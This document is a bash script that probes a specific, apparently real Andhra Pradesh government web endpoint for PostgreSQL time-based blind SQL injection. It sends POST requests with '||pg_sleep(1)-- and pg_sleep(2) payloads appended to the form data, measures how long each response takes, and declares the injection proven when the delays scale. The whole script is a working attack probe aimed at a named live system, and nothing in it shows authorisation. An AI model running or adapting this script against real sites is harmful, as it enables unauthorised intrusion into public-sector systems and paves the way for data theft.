#!/bin/bash
TARGET="https://scm.ap.gov.in/ro_commission_details_report_dist.jsp"
DATA="month=10&year=2023&roType=MDM&ro_name=MDM"
log() { echo -e "\033[1;36m[*]\033[0m $1"; }
ok()  { echo -e "\033[1;32m[+]\033[0m $1"; }
crit() { echo -e "\033[1;35m[CRITICAL]\033[0m $1"; }

log "Measuring Baseline (T0)..."
T0_START=$(date +%s%N); curl -sk -o /dev/null -X POST -d "$DATA" "$TARGET"; T0=$(( ($(date +%s%N) - T0_START) / 1000000 ))
log "T0: ${T0}ms"

log "Testing 1s Sleep (T1)..."
P1="${DATA}'||pg_sleep(1)--"
T1_START=$(date +%s%N); curl -sk -o /dev/null -X POST -d "$P1" "$TARGET"; T1=$(( ($(date +%s%N) - T1_START) / 1000000 ))
log "T1: ${T1}ms"

log "Testing 2s Sleep (T2)..."
P2="${DATA}'||pg_sleep(2)--"
T2_START=$(date +%s%N); curl -sk -o /dev/null -X POST -d "$P2" "$TARGET"; T2=$(( ($(date +%s%N) - T2_START) / 1000000 ))
log "T2: ${T2}ms"

D1=$(( T1 - T0 ))
D2=$(( T2 - T1 ))

log "Delta 1 (T1-T0): ${D1}ms"
log "Delta 2 (T2-T1): ${D2}ms"

if [ "$D1" -gt 800 ] && [ "$D2" -gt 800 ]; then
    crit "EMPIRICAL SQLI PROVEN: Linear scaling detected."
    crit "The server-side query is indeed vulnerable to PostgreSQL time-blind injection."
fi
